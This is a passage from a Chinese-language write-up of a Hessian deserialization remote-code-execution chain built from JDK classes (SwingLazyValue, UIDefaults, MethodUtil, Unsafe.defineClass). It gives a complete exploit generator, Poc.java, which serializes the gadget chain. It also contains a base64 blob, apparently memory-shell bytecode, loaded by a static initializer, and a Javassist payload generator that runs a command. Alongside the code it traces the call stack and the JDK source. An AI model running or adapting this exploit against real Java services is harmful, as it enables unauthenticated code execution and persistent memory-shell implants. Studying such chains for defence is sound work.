bYA37A6B7sAlVkZB7YBd7cBeL8AAwAlAHIAdQCcAJwAowCkAJoAswC6ALsAmgADABkAAABuABsAAAC+ABQAvwAXAMEAGwDCACUAxAApAMYAMADHADsAyABWAMkAXQDKAGAAxwBmAM0AaQDOAHIA0gB1ANAAdwDRAH4A0gCBANQAhgDVAI8A1wCVANgAnADaAKQA2wCmANwAswDgALsA4QC9AOIAGgAAAHoADAAzADMBAQECAAgAMAA2AV4BXwAHAHcABwBKAWAABwCmAA0ASgFhAAcAvQANAEoBYQAHAAAAygFFABwAAAAAAMoBXQEEAAEAAADKAWIBYwACAAAAygFkAOEAAwAUALYApwCoAAQAFwCzAWUApgAFABsArwFmAKgABgAoAAAALwAODkMHAHz+AAgHAHwHANMHAHz9ABcHAWcBLPkABQIIQgcAnAsNVAcAmg5HBwCaAAsAAAAIAAMAnACeAJoACAF5ABYAAQAHAAAAJQACAAAAAAAJuwACWbcBelexAAAAAQAZAAAACgACAAAAIQAIACIAAA==");
            Class c = (Class) dc.invoke(classLoader, "org.apache.commons.lang.j.HttpUtil", code, 0, code.length);
            c.newInstance();
        } catch (NoSuchMethodException e) {
            throw new RuntimeException(e);
        } catch (InvocationTargetException e) {
            throw new RuntimeException(e);
        } catch (IllegalAccessException e) {
            throw new RuntimeException(e);
        } catch (InstantiationException e) {
            throw new RuntimeException(e);
        }
    }
}

```

POC生成：

```java
package ysoserial.Hessian2.poc;

import com.caucho.hessian.io.HessianInput;
import com.caucho.hessian.io.HessianOutput;
import com.caucho.hessian.io.SerializerFactory;
import org.apache.tomcat.util.buf.HexUtils;
import sun.swing.SwingLazyValue;

import javax.swing.*;
import java.io.*;
import java.lang.reflect.Array;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.security.ProtectionDomain;
import java.util.Base64;
import java.util.HashMap;
import java.util.Hashtable;

public class Poc {
    static SerializerFactory serializerFactory = new SerializerFactory();

    public static void main(String[] args) throws Exception {

        FileInputStream fileInputStream = new FileInputStream("E:\\hvvdemo\\ysoserial-all\\ysoserial-master\\target\\classes\\ysoserial\\Hessian2\\poc\\EvilDefineClass.class");
        byte[] bcode = new byte[fileInputStream.available()];
        //bcode = Calc.genPayloadForWin();
        fileInputStream.read(bcode);
        System.out.println("bcode:" + Base64.getEncoder().encodeToString(bcode));

        serializerFactory.setAllowNonSerializable(true);

        Method invoke = sun.reflect.misc.MethodUtil.class.getMethod("invoke", Method.class, Object.class, Object[].class);
        Method defineClass = sun.misc.Unsafe.class.getDeclaredMethod("defineClass", String.class, byte[].class, int.class, int.class, ClassLoader.class, ProtectionDomain.class);
        Field f = sun.misc.Unsafe.class.getDeclaredField("theUnsafe");
        f.setAccessible(true);
        Object unsafe = f.get(null);
        Object[] ags = new Object[]{invoke, new Object(), new Object[]{defineClass, unsafe, new Object[]{"ysoserial.Hessian2.poc.EvilDefineClass", bcode, 0, bcode.length, null, null}}};

        SwingLazyValue swingLazyValue = new SwingLazyValue("sun.reflect.misc.MethodUtil", "invoke", ags);
        SwingLazyValue swingLazyValue1 = new SwingLazyValue("ysoserial.Hessian2.poc.EvilDefineClass", null, new Object[0]);

        Object[] keyValueList = new Object[]{"abc", swingLazyValue};
        Object[] keyValueList1 = new Object[]{"ccc", swingLazyValue1};

        UIDefaults uiDefaults1 = new UIDefaults(keyValueList);
        UIDefaults uiDefaults2 = new UIDefaults(keyValueList);
        UIDefaults uiDefaults3 = new UIDefaults(keyValueList1);
        UIDefaults uiDefaults4 = new UIDefaults(keyValueList1);

        Hashtable<Object, Object> hashtable1 = new Hashtable<>();
        Hashtable<Object, Object> hashtable2 = new Hashtable<>();
        Hashtable<Object, Object> hashtable3 = new Hashtable<>();
        Hashtable<Object, Object> hashtable4 = new Hashtable<>();

        hashtable1.put("a", uiDefaults1);
        hashtable2.put("a", uiDefaults2);
        hashtable3.put("b", uiDefaults3);
        hashtable4.put("b", uiDefaults4);

        HashMap<Object, Object> s = new HashMap<>();
        setFieldValue(s, "size", 4);
        Class<?> nodeC;
        try {
            nodeC = Class.forName("java.util.HashMap$Node");
        } catch (ClassNotFoundException e) {
            nodeC = Class.forName("java.util.HashMap$Entry");
        }
        Constructor<?> nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);
        nodeCons.setAccessible(true);

        Object tbl = Array.newInstance(nodeC, 4);
        Array.set(tbl, 0, nodeCons.newInstance(0, hashtable1, hashtable1, null));
        Array.set(tbl, 1, nodeCons.newInstance(0, hashtable2, hashtable2, null));
        Array.set(tbl, 2, nodeCons.newInstance(0, hashtable3, hashtable3, null));
        Array.set(tbl, 3, nodeCons.newInstance(0, hashtable4, hashtable4, null));
        setFieldValue(s, "table", tbl);
        byte[] bytes = serObj(s);

        System.out.println("63020048000464646464"+HexUtils.toHexString(bytes));
        des(bytes);
    }

    public static void setFieldValue(Object obj, String fieldName, Object
            value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }

    public static byte[] serObj(HashMap s) throws Exception {

        ByteArrayOutputStream btout = new ByteArrayOutputStream();
        HessianOutput hessianOutput = new HessianOutput(btout);
        hessianOutput.setSerializerFactory(serializerFactory);
        hessianOutput.writeObject(s);
        hessianOutput.close();
        return btout.toByteArray();
    }

    public static Object des(byte[] bytes) throws IOException {
        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(bytes);
        HessianInput hessianInput = new HessianInput(byteArrayInputStream);
        try {
            return hessianInput.readObject();
        } catch (EOFException e) {
            throw new IOException("Unexpected end of file while reading object", e);
        }
    }
}

```

## 原理分析

Hessian 相对比原生反序列化的利用链，有几个限制：

- gadget chain 起始方法只能为 hashCode/equals/compareTo 方法
- 利用链中调用的成员变量不能为 transient 修饰
- 所有的调用不依赖类中 readObject 的逻辑，也不依赖 getter/setter 的逻辑

目前常见的 Hessian 利用链在 marshalsec 中共有如下五个：

- Rome
- XBean
- Resin
- SpringPartiallyComparableAdvisorHolder
- SpringAbstractBeanFactoryPointcutAdvisor

### 0ctf2022 hessian-only-jdk writeup jdk原生链

https://xz.aliyun.com/t/11732?time__1311=Cq0xRiPWuDlx0nD2QQGCDn7o3PzlDQumD#/

### 探寻Hessian JDK原生反序列化不出网的任意代码执行利用链

https://blog.wanghw.cn/security/hessian-deserialization-jdk-rce-gadget.html#/

### 调用栈：

```
createValue:67, SwingLazyValue (sun.swing)
getFromHashtable:216, UIDefaults (javax.swing)
get:161, UIDefaults (javax.swing)
equals:813, Hashtable (java.util)
equals:813, Hashtable (java.util)
putVal:634, HashMap (java.util)
put:611, HashMap (java.util)
readMap:114, MapDeserializer (com.caucho.hessian.io)
readMap:577, SerializerFactory (com.caucho.hessian.io)
readObject:1160, HessianInput (com.caucho.hessian.io)
des:109, Poc (ysoserial.Hessian2.poc)
main:85, Poc (ysoserial.Hessian2.poc)
```

```json
HessianInput#readObject()->HashMap#put()->Hashtable#equals()->UIDefaults#get()->SwingLazyValue#createValue()->sun.reflect.misc.MethodUtil#invoke()->任意方法调用加载字节码

HessianInput#readObject()->HashMap#put()->Hashtable#equals()->UIDefaults#get()->SwingLazyValue#createValue()->任意类实例化
```

任意方法调用使用`sun.reflect.misc.MethodUtil`中的`invoke`去调用`sun.misc.Unsafe`的`defineClass`方法去创建恶意类`Evil`，在实例化时触发`static`方法，`Evil`类中的`static`方法使用`ClassLoader`的`defineClass`将内存马字节码加载入`JVM`。

```java
    static {
        ClassLoader classLoader = ClassLoader.getSystemClassLoader();
        try {
            java.lang.reflect.Method dc = ClassLoader.class.getDeclaredMethod("defineClass", String.class, byte[].class, int.class, int.class);
            dc.setAccessible(true);
            byte[] code = java.util.Base64.getDecoder().decode("Base64编码的内存马字节码");
            Class c = (Class) dc.invoke(classLoader, "内存马全类名", code, 0, code.length);
            c.newInstance();
        } catch (NoSuchMethodException e) {
            throw new RuntimeException(e);
        } catch (InvocationTargetException e) {
            throw new RuntimeException(e);
        } catch (IllegalAccessException e) {
            throw new RuntimeException(e);
        } catch (InstantiationException e) {
            throw new RuntimeException(e);
        }
    }
```

至于这里为什么不直接使用`sun.misc.Unsafe`的`defineClass`方法去直接加载内存马，而是通过`Evil`的`static`方法做一个"中介"，是因为如果直接加载的情况会失败导致无法寻找到内存马类无法成功注入，采用这种"中介"的形式就解决了这个问题。

#### HashMap#put()

```java
 public V put(K key, V value) {
        return putVal(hash(key), key, value, false, true);
    }

    /**
     * Implements Map.put and related methods
     *
     * @param hash hash for key
     * @param key the key
     * @param value the value to put
     * @param onlyIfAbsent if true, don't change existing value
     * @param evict if false, the table is in creation mode.
     * @return previous value, or null if none
     */
    final V putVal(int hash, K key, V value, boolean onlyIfAbsent,
                   boolean evict) {
        Node<K,V>[] tab; Node<K,V> p; int n, i;
        if ((tab = table) == null || (n = tab.length) == 0)
            n = (tab = resize()).length;
        if ((p = tab[i = (n - 1) & hash]) == null)
            tab[i] = newNode(hash, key, value, null);
        else {
            Node<K,V> e; K k;
            if (p.hash == hash &&
                ((k = p.key) == key || (key != null && key.equals(k))))
                e = p;
            else if (p instanceof TreeNode)
                e = ((TreeNode<K,V>)p).putTreeVal(this, tab, hash, key, value);
            else {
                for (int binCount = 0; ; ++binCount) {
                    if ((e = p.next) == null) {
                        p.next = newNode(hash, key, value, null);
                        if (binCount >= TREEIFY_THRESHOLD - 1) // -1 for 1st
                            treeifyBin(tab, hash);
                        break;
                    }
                    if (e.hash == hash &&
                        ((k = e.key) == key || (key != null && key.equals(k))))//触发Hashtable#equals()
                        break;
                    p = e;
                }
            }
            if (e != null) { // existing mapping for key
                V oldValue = e.value;
                if (!onlyIfAbsent || oldValue == null)
                    e.value = value;
                afterNodeAccess(e);
                return oldValue;
            }
        }
        ++modCount;
        if (++size > threshold)
            resize();
        afterNodeInsertion(evict);
        return null;
    }

```

#### Hashtable#equals()

```java
    public synchronized boolean equals(Object o) {
        if (o == this)
            return true;

        if (!(o instanceof Map))
            return false;
        Map<?,?> t = (Map<?,?>) o;
        if (t.size() != size())
            return false;

        try {
            Iterator<Map.Entry<K,V>> i = entrySet().iterator();
            while (i.hasNext()) {
                Map.Entry<K,V> e = i.next();
                K key = e.getKey();
                V value = e.getValue();
                if (value == null) {
                    if (!(t.get(key)==null && t.containsKey(key)))
                        return false;
                } else {
                    if (!value.equals(t.get(key))) //当t触发UIDefaults#get()
                        return false;
                }
            }
        } catch (ClassCastException unused)   {
            return false;
        } catch (NullPointerException unused) {
            return false;
        }

        return true;
    }
```

#### UIDefaults#get()

```java
    public Object get(Object key) {
        Object value = getFromHashtable( key );
        return (value != null) ? value : getFromResourceBundle(key, null);
    }

    /**
     * Looks up up the given key in our Hashtable and resolves LazyValues
     * or ActiveValues.
     */
    private Object getFromHashtable(final Object key) {
        /* Quickly handle the common case, without grabbing
         * a lock.
         */
        Object value = super.get(key);
        if ((value != PENDING) &&
            !(value instanceof ActiveValue) &&
            !(value instanceof LazyValue)) {
            return value;
        }

        /* If the LazyValue for key is being constructed by another
         * thread then wait and then return the new value, otherwise drop
         * the lock and construct the ActiveValue or the LazyValue.
         * We use the special value PENDING to mark LazyValues that
         * are being constructed.
         */
        synchronized(this) {
            value = super.get(key);
            if (value == PENDING) {
                do {
                    try {
                        this.wait();
                    }
                    catch (InterruptedException e) {
                    }
                    value = super.get(key);
                }
                while(value == PENDING);
                return value;
            }
            else if (value instanceof LazyValue) {
                super.put(key, PENDING);
            }
            else if (!(value instanceof ActiveValue)) {
                return value;
            }
        }

        /* At this point we know that the value of key was
         * a LazyValue or an ActiveValue.
         */
        if (value instanceof LazyValue) {
            try {
                /* If an exception is thrown we'll just put the LazyValue
                 * back in the table.
                 */
                value = ((LazyValue)value).createValue(this);//SwingLazyValue#createValue()
            }
            finally {
                synchronized(this) {
                    if (value == null) {
                        super.remove(key);
                    }
                    else {
                        super.put(key, value);
                    }
                    this.notifyAll();
                }
            }
        }
        else {
            value = ((ActiveValue)value).createValue(this);
        }

        return value;
    }
```

#### SwingLazyValue#createValue()

`SwingLazyValue#createValue()`这里触发任意方法可以借助`sun.reflect.misc.MethodUtil#invoke()`去加载恶意字节码。

```JAVA
    public Object createValue(UIDefaults var1) {
        try {
            ReflectUtil.checkPackageAccess(this.className);
            Class var2 = Class.forName(this.className, true, (ClassLoader)null);
            Class[] var3;
            if (this.methodName != null) {
                var3 = this.getClassArray(this.args);
                Method var6 = var2.getMethod(this.methodName, var3);
                this.makeAccessible(var6);
                return var6.invoke(var2, this.args);//任意方法调用
            } else {
                var3 = this.getClassArray(this.args);
                Constructor var4 = var2.getConstructor(var3);
                this.makeAccessible(var4);
                return var4.newInstance(this.args);//实例化恶意类
            }
        } catch (Exception var5) {
            return null;
        }
    }
```

#### 恶意字节码示例：

```java
    public static byte[] genPayloadForWin() throws CannotCompileException, IOException {
        // 获取 ClassPool 对象
        ClassPool pool = ClassPool.getDefault();
        // 创建 Evil 类
        CtClass ctClass = pool.makeClass("Evil");
        // 创建静态代码块
        CtConstructor staticBlock = ctClass.makeClassInitializer();
        staticBlock.setBody("{\n" +
                "        Runtime.getRuntime().exec(\"calc\");\n" +
            "}");
        ctClass.getClassFile().setMajorVersion(50);
        // 生成的类字节码
        return ctClass.toBytecode();
    }
```

```java
public static void main(String[] args) throws Exception {
    	//获取字节码
        byte[] bcode = Calc.genPayloadForWin();
        System.out.println("bcode:" + Base64.getEncoder().encodeToString(bcode));
    	//获取invoke方法
        Method invoke = sun.reflect.misc.MethodUtil.class.getMethod("invoke", Method.class, Object.class, Object[].class);
    	//获取defineClass方法
        Method defineClass = sun.misc.Unsafe.class.getDeclaredMethod("defineClass", String.class, byte[].class, int.class, int.class, ClassLoader.class, ProtectionDomain.class);

    
        //拿到sun.misc.Unsafe的theUnsafe字段
        Field f = sun.misc.Unsafe.class.getDeclaredField("theUnsafe");
        f.setAccessible(true);
        //拿到sun.misc.Unsafe的theUnsafe字段的Unsafe对象
        Object unsafe = f.get(null);

            //构造sun.misc.Unsafe的defineClass方法的参数
        Object[] objs = new Object[]{defineClass, unsafe, new Object[]{"Evil", bcode, 0, bcode.length, null, null}};
        /*
    	public static Object invoke(Method var0, Object var1, Object[] var2)
        参数：
            Method method: 表示要调用的 java.lang.reflect.Method 对象。这个对象代表反射获取的一个类的方法。
            Object obj: 表示调用该方法的目标对象。如果该方法是 static 方法，则这个参数可以为 null。
            Object[] args: 表示传递给方法的参数数组。如果方法没有参数，可以传递 null 或一个空数组。
        * */
        //调用sun.misc.Unsafe的defineClass方法，创建Evil类
        sun.reflect.misc.MethodUtil.invoke(defineClass,defineClass,new Object[]{"Evil", bcode, 0, bcode.length, null, null});

    	//实例化Evil触发static方法
        Class.forName("Evil").newInstance();
		}
}
```